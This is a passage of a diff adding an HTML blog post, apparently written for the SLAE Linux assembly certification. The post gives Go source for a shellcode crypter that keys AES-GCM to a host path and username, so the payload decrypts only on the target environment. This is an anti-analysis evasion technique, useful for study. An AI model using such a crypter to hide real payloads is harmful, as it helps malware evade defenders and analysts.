+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85</span>    nonce, _ := hex.<span style=color:#ff0086;font-weight:700>DecodeString</span>(ciphertext[:<span style=color:#0086f7;font-weight:700>24</span>])
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87</span>    block, err := aes.<span style=color:#ff0086;font-weight:700>NewCipher</span>(envKey)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88</span>    <span style=color:#fb660a;font-weight:700>if</span> err != <span style=color:#fb660a;font-weight:700>nil</span> {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89</span>        <span style=color:#fb660a;font-weight:700>return</span> []<span style=color:#cdcaa9;font-weight:700>byte</span>{}, err
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90</span>    }
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92</span>    aesgcm, err := cipher.<span style=color:#ff0086;font-weight:700>NewGCM</span>(block)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93</span>    <span style=color:#fb660a;font-weight:700>if</span> err != <span style=color:#fb660a;font-weight:700>nil</span> {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94</span>        <span style=color:#fb660a;font-weight:700>return</span> []<span style=color:#cdcaa9;font-weight:700>byte</span>{}, err
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95</span>    }
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97</span>    plaintxt, err := aesgcm.<span style=color:#ff0086;font-weight:700>Open</span>(<span style=color:#fb660a;font-weight:700>nil</span>, nonce, ciphertxt, <span style=color:#fb660a;font-weight:700>nil</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98</span>    <span style=color:#fb660a;font-weight:700>if</span> err != <span style=color:#fb660a;font-weight:700>nil</span> {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99</span>        <span style=color:#fb660a;font-weight:700>return</span> []<span style=color:#cdcaa9;font-weight:700>byte</span>{}, err
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">100</span>    }
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">101</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">102</span>    <span style=color:#fb660a;font-weight:700>return</span> plaintxt, <span style=color:#fb660a;font-weight:700>nil</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">103</span>}
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">104</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">105</span><span style=color:#fb660a;font-weight:700>func</span> <span style=color:#ff0086;font-weight:700>main</span>() {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">106</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">107</span>    <span style=color:#fb660a;font-weight:700>if</span> len(os.Args) &lt;= <span style=color:#0086f7;font-weight:700>1</span> {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">108</span>        flag.<span style=color:#ff0086;font-weight:700>Usage</span>()
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">109</span>        os.<span style=color:#ff0086;font-weight:700>Exit</span>(<span style=color:#0086f7;font-weight:700>0</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">110</span>    }
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">111</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">112</span>    opts := <span style=color:#ff0086;font-weight:700>processArgs</span>()
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">113</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">114</span>    currentUser := &amp;user.User{}
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">115</span>    currentUser, err := user.<span style=color:#ff0086;font-weight:700>Current</span>()
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">116</span>    envPath := <span style=color:#0086d2>&#34;/etc/vmware-tools/scripts/vmware/network&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">117</span>    envKey := sha256.<span style=color:#ff0086;font-weight:700>Sum256</span>([]byte(envPath + currentUser.Username))
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">118</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">119</span>    <span style=color:#fb660a;font-weight:700>if</span> opts.encrypt {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">120</span>        <span style=color:#fb660a;font-weight:700>if</span> opts.shellcode == <span style=color:#0086d2>&#34;&#34;</span> {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">121</span>            fmt.<span style=color:#ff0086;font-weight:700>Println</span>(<span style=color:#0086d2>&#34;[-] Please specify your shellcode&#34;</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">122</span>            os.<span style=color:#ff0086;font-weight:700>Exit</span>(<span style=color:#0086f7;font-weight:700>1</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">123</span>        }
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">124</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">125</span>        ciphertext, err := <span style=color:#ff0086;font-weight:700>encrypt</span>(opts.shellcode, envKey[:])
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">126</span>        <span style=color:#fb660a;font-weight:700>if</span> err != <span style=color:#fb660a;font-weight:700>nil</span> {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">127</span>            fmt.<span style=color:#ff0086;font-weight:700>Println</span>(<span style=color:#0086d2>&#34;[-] Something went wrong encrypting your shellcode. Error: &#34;</span>, err)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">128</span>            os.<span style=color:#ff0086;font-weight:700>Exit</span>(<span style=color:#0086f7;font-weight:700>1</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">129</span>        }
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">130</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">131</span>        fmt.<span style=color:#ff0086;font-weight:700>Printf</span>(<span style=color:#0086d2>&#34;[+] Your encrypted shellcode: %s\n&#34;</span>, ciphertext)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">132</span>        <span style=color:#fb660a;font-weight:700>return</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">133</span>    }
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">134</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">135</span>    <span style=color:#fb660a;font-weight:700>if</span> opts.decrypt {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">136</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">137</span>        <span style=color:#fb660a;font-weight:700>if</span> opts.shellcode == <span style=color:#0086d2>&#34;&#34;</span> {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">138</span>            fmt.<span style=color:#ff0086;font-weight:700>Println</span>(<span style=color:#0086d2>&#34;[-] Please specify your encrypted shellcode&#34;</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">139</span>            os.<span style=color:#ff0086;font-weight:700>Exit</span>(<span style=color:#0086f7;font-weight:700>1</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">140</span>        }
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">141</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">142</span>        encryptedShellcode := opts.shellcode
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">143</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">144</span>        err = filepath.<span style=color:#ff0086;font-weight:700>Walk</span>(<span style=color:#0086d2>&#34;/etc/&#34;</span>, <span style=color:#fb660a;font-weight:700>func</span>(path <span style=color:#cdcaa9;font-weight:700>string</span>, info os.FileInfo, err <span style=color:#cdcaa9;font-weight:700>error</span>) <span style=color:#cdcaa9;font-weight:700>error</span> {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">145</span>            envKey := sha256.<span style=color:#ff0086;font-weight:700>Sum256</span>([]byte(path + currentUser.Username))
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">146</span>            plaintext, err := <span style=color:#ff0086;font-weight:700>decrypt</span>(encryptedShellcode, envKey[:])
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">147</span>            <span style=color:#fb660a;font-weight:700>if</span> err != <span style=color:#fb660a;font-weight:700>nil</span> {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">148</span>                <span style=color:#080;background-color:#0f140f;font-style:italic>// Disregard errors
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">149</span><span style=color:#080;background-color:#0f140f;font-style:italic></span>                <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#fb660a;font-weight:700>nil</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">150</span>            } <span style=color:#fb660a;font-weight:700>else</span> {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">151</span>                fmt.<span style=color:#ff0086;font-weight:700>Printf</span>(<span style=color:#0086d2>&#34;[+] Decrypted shellcode: %s\n&#34;</span>, plaintext)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">152</span>            }
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">153</span>            <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#fb660a;font-weight:700>nil</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">154</span>        })
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">155</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">156</span>        <span style=color:#fb660a;font-weight:700>if</span> err != <span style=color:#fb660a;font-weight:700>nil</span> {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">157</span>            fmt.<span style=color:#ff0086;font-weight:700>Printf</span>(<span style=color:#0086d2>&#34;error walking the path %q: %v\n&#34;</span>, <span style=color:#0086d2>&#34;/etc/&#34;</span>, err)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">158</span>            <span style=color:#fb660a;font-weight:700>return</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">159</span>        }
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">160</span>    }
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">161</span>}
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">162</span>
+</code></pre></div><hr>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p>
+<p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p>
+<p>Student ID: SLAE-1490</p>
+</article>
+</div><footer>
+</footer></main>
+<script src=/js/particles.min.js defer></script>
 <script src=/js/particles.conf.js defer></script>
 <script src=/js/baffle.min.js async></script>
-<script src=/js/main.js defer async></script></body></html>
+<script src=/js/main.js defer async></script>
+</body>
+</html>
